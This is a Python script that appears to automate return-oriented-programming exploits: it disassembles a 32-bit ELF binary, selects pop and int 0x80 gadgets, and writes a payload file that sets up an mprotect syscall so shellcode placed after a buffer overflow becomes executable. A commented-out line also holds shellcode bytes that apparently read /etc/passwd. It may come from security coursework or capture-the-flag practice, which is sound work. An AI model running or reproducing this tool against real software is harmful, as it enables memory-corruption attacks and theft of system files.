#!/usr/bin/env python
import sys
import os
import binascii
from capstone import *
from elftools.elf.elffile import ELFFile

# GLOBAL VARIABLES #
addresses, mnemonics, op_strs = [], [], [] # the detailed information for each gadget
notSafe = ['eax','ebx','ecx','edx'] # the regs we need, so be careful to  not modify after they're set!
# a dictionary holding the values we need in each of the registers
values = {'eax':"b\'\\x7d\\x00\\x00\\x00\'", 'ecx':"b\'\\x00\\x10\\x02\\x00\'", 'edx':"b\'\\x07\\x00\\x00\\x00\'"}

def openBin(binary):
    ''' opens the binary file as specified in the parameter.
        returns the file descriptor. '''
    fd = open(binary, "rb") # open the file
    return fd # return the file descriptor

def readBin(elf, section):
    ''' reads the requested section of the specified elf binary file. 
        returns the data from that section. '''
    code = elf.get_section_by_name(section) # selects the section of the file to read
    return code.data() # returns the code held within that section

def sortCode(file, base_address):
    ''' sorts the file's code into different sections. Gets the addresses and
        code from each section. Also finds the size of .text so we know
        how much to overflow the buffer. '''
    # open the file in ELF format
    try:
        fd = openBin(file)
        elf = ELFFile(fd)
    except:
        raise TypeError("The file " + file + "is not in the proper format.")
    md = Cs(CS_ARCH_X86, CS_MODE_32) # set the architecture
    count, textAddr, nextAddr = 0, 0, 0
    foundText = False
    first = True # check if it's the first section, if so, skip
    for section in elf.iter_sections():
        if first:
            first = False
            continue
        # if the .text section has just been found, save the address of the next section
        if foundText:
            foundText = False
            nextAddr = section["sh_addr"]
        # the .text section has been found! save its address
        if section.name == ".text":
            textAddr = section["sh_addr"]
            foundText = True
        # read the file
        #print(hex(section["sh_addr"]-section["sh_offset"]))
        code = readBin(elf, section.name)
        # save all the relevant information into their respective arrays
        # disassemble the code, and offset is from the base of the binary
        for i in md.disasm(code, int(base_address, base=16)+section["sh_offset"]):
            addresses.append(i.address)
            mnemonics.append(i.mnemonic)
            op_strs.append(i.op_str)
            count += 1 # count how many lines we have
    # difference btwn the beginning address of .text and beginning address of the next section
    length = nextAddr - textAddr
    return (length, textAddr)

def findGadgets(maxLen):
    ''' find the gadgets with size less than maxLen '''
    gadgets = []
    # search through all the assembly commands until the right commands are found
    for i in range(len(mnemonics)):
        # other gadgets will end with ret 
        if mnemonics[i] == "ret":
            limit = 0 # keeps track of gadget size
            gadget = [i] # 
            k = i-1
            # start from the end of the gadget and work backwards
            # until either a return has been hit or the len is maxLen
            while limit < (maxLen-1) and mnemonics[k] != "ret":
                gadget.append(k) 
                limit += 1 # increase limit count
                k -=1 # so we check the previous mnemonic
            gadget = gadget[::-1] # get the entire gadget
            gadgets.append(gadget) # add the gadget to the whole list
    return gadgets

def findCommand(command, mnemonic, op_str):
    ''' Checks if a command has the given mnemonic and op_str '''
    if mnemonics[command] == mnemonic and op_strs[command] == op_str:
        return True
    return False

def sortGadgets(gadgets):
    ''' Go through all available gadgets to find the smallest valid
    gadget for each required command '''
    foundGadgets = [[],[],[],[],[],[],[]]
    finalGadgets = [None, None, None, None, None, None, None]
    for i in range(len(gadgets)):
        for j in range(len(gadgets[i])):
            command = gadgets[i][j]
            ### FIND GADGETS TO HELP SET EAX ###
            if findCommand(command, "pop", "eax"):
                foundGadgets[0].append(gadgets[i][j:])
                foundGadgets[0].sort(key=len)
            ### FIND GADGETS TO HELP SET EBX ###
            if findCommand(command, "pop", "ebx"):
                foundGadgets[1].append(gadgets[i][j:])
                foundGadgets[1].sort(key=len)
            ### FIND GADGETS TO HELP SET ECX ###
            if findCommand(command, "pop", "ecx"):
                foundGadgets[2].append(gadgets[i][j:])
                foundGadgets[2].sort(key=len)
            ### FIND GADGETS TO HELP SET EDX ###
            if findCommand(command, "pop", "edx"):
                foundGadgets[3].append(gadgets[i][j:])
                foundGadgets[3].sort(key=len)
            ### FIND GADGET FOR SYSCALL ###
            if findCommand(command, "int", "0x80"):
                ret = False
                spot = -1
                for k in range(len(gadgets[i])):
                    if mnemonics[gadgets[i][k]] == 'ret':
                        ret = True
                        spot = k
                if ret:
                    foundGadgets[4].append(gadgets[i][j:spot])
                    foundGadgets[4].sort(key=len)
            ### FIND GADGETS TO ZERO OUT EAX ###
            if findCommand(command, "xor", "eax, eax"):
                foundGadgets[5].append(gadgets[i][j:])
                foundGadgets[5].sort(key=len)
            ### FIND GADGETS TO HELP SET EAX ###
            if findCommand(command, "inc", "eax") or findCommand(command, "add", "eax, 1"):
                foundGadgets[6].append(gadgets[i][j:])
                foundGadgets[6].sort(key=len)
    return foundGadgets

def cleanGadgets(gadgets):
    ''' finds the shortest valid gadget for each required command.
    Returns the list of these gadgets if a good one can be found for 
    each or an empty list otherwise'''
    # the array of gadgets we have found to use for each required command
    finalGadgets = [None, None, None, None, None, None, None]
    for i in range(len(gadgets)):
        # this statement should never be true, but if it is, we can't find enough gadgets
        if gadgets[i] == None:
            return []
        for j in range(len(gadgets[i])):
            places = [gadgets[i][j], []] # an array that holds the gadget we're investigating
            # for each register we need to watch, add an empty array to places 
            # this will keep track of where we need to put in fillers to the stack
            for x in notSafe:
                places.append([])
            # if the gadget length is 2, we're good to go!
            if len(gadgets[i][j]) == 2:
                finalGadgets[i] = places # add the gadget to finalGadgets
                break # stop looking for this gadget
            bad = False # keeps track of if the gadget is invalid or not
            # go through the gadget to see if it's valid
            for k in range(1,len(gadgets[i][j])):
                # if the mnemonic is a pop...
                if mnemonics[gadgets[i][j][k]] == "pop":
                    # if we're popping a register that we need to watch...
                    for l in range(len(notSafe)):
                        # save the position this needs to be popped into
                        if notSafe[l] in op_strs[gadgets[i][j][k]]:
                            places[2+l].append(k)
                            break
                        # otherwise save the position into another place
                        elif l == len(notSafe)-1:
                            places[1].append(k)
                #can do other checks here
                if "mov" in mnemonics[gadgets[i][j][k]]:
                    bad = True
                    break
                # if the mnemonic is lea, it's unusable
                if "lea" in mnemonics[gadgets[i][j][k]]:
                    bad = True
                    break
                if "j" == mnemonics[gadgets[i][j][k]][0]:
                    bad = True
                    break
            if bad:
                continue
            finalGadgets[i] = places
            break
    return finalGadgets


def ordArr(places, info):
    ''' create a string to add to the python file that will fill
    the stack with the correct values to pop '''
    if info == "int":
        s = "s += "+byte_ify(addresses[places[0][0]])+" # address of " + info + " gadget\n"
    else:
        # start with the address of the current gadget
        s = "s += "+byte_ify(addresses[places[0][0]])+" # address of " + info + " gadget\n"
        # append the argument to the string
        s += "s += "+values[info]+" # value to pop into " + info + " register\n"
        # if the number of regs that need to be filled is 
        # the same as the middle of the gadget, add that many As
    if len(places[1]) == len(places[0])-2:
        s += "s += b\'A\'*4*"+str(len(places[0])-2)+" # filler to pop into extra registers\n"
    else:
        for i in range(1,len(places[0])-1):
            # if we are popping to a register we don't care about, fill with As
            if i in places[1]:
                s += "s += b\'A\'*4 # filler to pop into extra registers \n"
            # if we are popping to a register we care about, fill with the correct val
            else:
                for j in range(len(notSafe)):
                    if i in places[j+2]: # find the right register
                        s += "s += "+values[notSafe[j]]+" # the value to pop into a required register\n"
    return s

def byte_ify(hexObj):
    ''' turn the parameter into a byte representation to put 
    into the outputted python file. Add that byte representation
    to a string '''
    hexObj = hex(hexObj) # turn it into hex so we know the exact format
    hexObj = hexObj[2:len(hexObj)-1]
    hexObj = hexObj[::-1]
    s = "b\'"  
    # change the format to \x00\x00\x00\x00
    for i in range(0,len(hexObj)-1,2):
        s += "\\x"+str(hexObj[i+1])+str(hexObj[i])
    # must be even length! if not, add an extra 0
    if len(hexObj)%2 != 0:
        s += "\\x0"+str(hexObj[len(hexObj)-1])
    s += "\'"
    return s
def getAllCommands(command):
    s = ""
    for i in range(len(command)):
        s += mnemonics[command[i]] +" "+ op_strs[command[i]]+" ; "
    return s

def generateAttack(gadgets, bin_name):
    ''' generate the python file that will be able to attack the binary '''
    spot = 0
    fileName = "payload_" + bin_name.split('.')[0] + str(spot) + ".py"
    while(os.path.exists(fileName)):
        spot += 1
        fileName = "payload_" + bin_name.split('.')[0] + str(spot) + ".py"
    f = open(fileName, "w")
    s = '#!/usr/bin/env python\n' # make the file an executable
    s += "s = b\'\' # input padding here\n" # ask the user for padding
    # Insert information to pop ebx
    s += "# gadget: "+getAllCommands(gadgets[1][0])+"\n"
    s += ordArr(gadgets[1], 'ebx')
    # Insert information to pop ebx
    s += "# gadget: "+getAllCommands(gadgets[2][0])+"\n"
    s += ordArr(gadgets[2], 'ecx')
    # Insert information to pop ebx
    s += "# gadget: "+getAllCommands(gadgets[3][0])+"\n"
    s += ordArr(gadgets[3], 'edx')
    # Insert information to pop ebx
    s += "# gadget: "+getAllCommands(gadgets[0][0])+"\n"
    s += ordArr(gadgets[0], 'eax')
    # Insert the gadget for the syscall
    s += "# gadget: "+getAllCommands(gadgets[4][0])+"ret ;\n"
    s += ordArr(gadgets[4], "int")
    s += "# address of the shellcode\n"
    s += "s += b\'\'\n"
    s += "# shellcode\n"
    #s += b'\x6a\x02\x48\x31\xf6\x58\x48\x8d\x3d\x37\x11\x11\x01\x48\x81\xef\x01\x11\x11\x01\x48\x31\xd2\x0f\x05\x48\x89\xc7\x48\x31\xc0\x48\x83\xec\x1e\x48\x89\xe6\x6a\x1e\x5a\x0f\x05\x48\x89\xc2\x6a\x01\x6a\x01\x5f\x58\x48\x89\xe6\x0f\x05\x48\x31\xc0\x04\x3c\x48\x31\xff\x0f\x05\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'
    s += "s += b\'\' # put shellcode here\n" # ask the user for shellcode
    s += "print(s) # print the bytearray\n" # print the bytearray 
    print("FILE: " + fileName)
    print(s+"\n") # print the generated attack for previes
    f.write(s) # write to the file
    f.close()
    # turn the python file into a payload file
    os.popen("python " + fileName + " > payload_"+bin_name.split(".")[0])
    os.popen("rm " + fileName)

def splitBytes(hexObj):
    hexObj = hexObj[2:len(hexObj)]
    hexObj = hexObj[::-1]
    # change the format to \x00\x00\x00\x00
    s = "b\'"
    for i in range(0,len(hexObj)-1,2):
        s += "\\x"+str(hexObj[i+1])+str(hexObj[i])
    values['ebx'] = s+"\'"

if __name__ == "__main__":
    # ensure that the user gave at least one binary file to work with
    if len(sys.argv) < 4:
        print("Usage: " + sys.argv[0] + " <binary1> <page aligned address where the shellcode resides> <binary base address> ...")
    elif len(sys.argv)%3 != 1:
        print("Usage: " + sys.argv[0] + " <binary1> <page aligned address where the shellcode resides> <binary base address> ...")
    else:
        # make sure the binary file exists
        for x in sys.argv[1::3]:
            if (not os.path.exists(x)):
                # if the binary file does not exist, throw an error
                raise FileNotFoundError(x + " was not found.")
        for x in range(1, len(sys.argv), 3):
            # get the necessary code data
            (length, textAddr) = sortCode(sys.argv[x], sys.argv[x+2])
            
            # fill in the global page aligned address
            splitBytes(sys.argv[x+1])
            # find all gadgets in the binary
            gadgets = findGadgets(6)

            # sorts the gadgets into an array of form
            # [ [pop eax gadget], [pop ebx], [pop ecx], [pop edx], [syscall], [xor eax eax], [inc eax]  ]
            found = sortGadgets(gadgets)
            if None in found:
                print("Error (code1): File " + sys.argv[x] + " is missing required gadgets.\nPlease see an administrator for help! :)\n")
                continue
            
            # finds the shortest valid gadget available for each necessary command
            finalGadgets = cleanGadgets(found)
            if None in finalGadgets or finalGadgets == []:
                print("Error (code2): File " + sys.argv[x] + " is missing required gadgets.\nPlease see an administrator for help! :)\n")
                continue

            # create the python file that can be edited to attack the binary    
            generateAttack(finalGadgets, sys.argv[x])
